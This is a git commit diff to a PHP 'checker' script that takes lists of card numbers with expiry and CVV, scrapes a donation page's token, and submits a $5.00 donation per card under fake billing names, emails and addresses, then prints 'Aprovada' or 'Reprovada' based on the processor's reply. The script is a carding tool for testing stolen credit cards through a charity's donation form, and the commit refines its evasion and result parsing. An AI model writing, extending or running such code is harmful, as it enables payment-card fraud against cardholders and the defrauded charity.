3ddce66689d6381c69f40763752d6351edbe9e67
nic0latesla <elec7r00n@gmail.com>
2018-10-05 11:38:15 -0700

    New changes

--- api.php
+++ api.php
@@ -11,10 +11,22 @@ $mes = $separar[1];
 $ano = $separar[2];
 $cvv = $separar[3];
 
+if(empty($country)){
+	$country = "US";
+}
+
+if(empty($zipcode)){
+	$zipcode = 10001;
+}
+
+if(empty($city)){
+	$city = "New York";
+}
+
 function doPost($url,$data,$headers){
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_USERAGENT, 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36');
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -67,21 +79,31 @@ $m = $mess;
 return $m;
 }
 
-$r =  doPost('https://www.websitedonate.com');
+$r =  doPost('www.website.com');
 
 $token =  getToken($r,'authenticity_token" type="hidden" value="','"');
-$mes = formatMes($mes);
-$r =  doPost("https://www.websitedonate.com","authenticity_token=$token%3D&page_id=14774&return_to=https%3A%2F%2Fwww.cair.com%2Fauthorize&email_address=&donation%5Bamount%5D=5.00&donation%5Bcustom_values%5D%5Bzakat_ind%5D=0&donation%5Bcard_number%5D=$cc&donation%5Bcard_expires_on%281i%29%5D=$ano&donation%5Bcard_expires_on%282i%29%5D=$mes&donation%5Bcard_expires_on%283i%29%5D=1&donation%5Bcard_verification%5D=$cvv&donation%5Bfirst_name%5D=Peter&donation%5Blast_name%5D=Steven&donation%5Bbilling_address_attributes%5D%5Bcountry_code%5D=US&donation%5Bbilling_address_attributes%5D%5Bstate%5D=NY&donation%5Bbilling_address_attributes%5D%5Baddress1%5D=Street+1234&donation%5Bbilling_address_attributes%5D%5Baddress2%5D=&donation%5Bbilling_address_attributes%5D%5Baddress3%5D=&donation%5Bbilling_address_attributes%5D%5Bcity%5D=New+York&donation%5Bbilling_address_attributes%5D%5Bzip%5D=10001&donation%5Bemail%5D=petersteven%40gmail.com&donation%5Bbilling_address_attributes%5D%5Bphone_number%5D=154548454848&donation%5Bemail_opt_in%5D=0&donation%5Bis_private%5D=0");
 
-//echo $r;
-//exit();
+$mes = formatMes($mes);
+$r =  doPost("https://www.website.com","authenticity_token=$token&page_id=14774&return_to=https%3A%2F%2Fwww.cair.com%2Fauthorize&email_address=&donation%5Bamount%5D=5.00&donation%5Bcustom_values%5D%5Bzakat_ind%5D=0&donation%5Bcard_number%5D=$cc&donation%5Bcard_expires_on%281i%29%5D=$ano&donation%5Bcard_expires_on%282i%29%5D=$mes&donation%5Bcard_expires_on%283i%29%5D=1&donation%5Bcard_verification%5D=$cvv&donation%5Bfirst_name%5D=Peter&donation%5Blast_name%5D=Paterson&donation%5Bbilling_address_attributes%5D%5Bcountry_code%5D=$country&donation%5Bbilling_address_attributes%5D%5Bstate%5D=NY&donation%5Bbilling_address_attributes%5D%5Baddress1%5D=Av. Patrerinon&donation%5Bbilling_address_attributes%5D%5Baddress2%5D=&donation%5Bbilling_address_attributes%5D%5Baddress3%5D=&donation%5Bbilling_address_attributes%5D%5Bcity%5D=$city&donation%5Bbilling_address_attributes%5D%5Bzip%5D=$zipcode&donation%5Bemail%5D=mitrunfaterin%40gmail.com&donation%5Bbilling_address_attributes%5D%5Bphone_number%5D=154548454848&donation%5Bemail_opt_in%5D=0&donation%5Bis_private%5D=0");
 
 if (strpos($r, 'This transaction has been declined')) {
         echo '<span class="label label-danger">#Reprovada ❌ '.$lista.' #nic0la 7esla<br></span>';
-}else if(strpos($r, 'The credit card number is invalid')){
+}
+
+if(strpos($r, 'The credit card number is invalid')){
 	echo '<span class="label label-danger">#The credit card number is invalid ❌ '.$lista.' #nic0la 7esla<br></span>';
-	}else{
-		echo '<span class="label label-success">#Aprovada ✅ '.$lista.' #nic0la 7esla | Informacion | BIN: '.$binn.'</span> <br>';
+}
+
+if(strpos($r, 'CVV does not match')){
+		echo '<span class="label label-danger">#CVV does not match ❌ '.$lista.' #nic0la 7esla<br></span>';		
+}
+
+
+if(strpos($r, 'The credit card has expired')){
+		echo '<span class="label label-danger">#The credit card has expired ❌ '.$lista.' #nic0la 7esla<br></span>';		
+}else{
+	//echo $r;
+	echo '<span class="label label-success">#Aprovada ✅ '.$lista.' #nic0la 7esla | Informacion |</span> <br>';
 }
 
 ?>
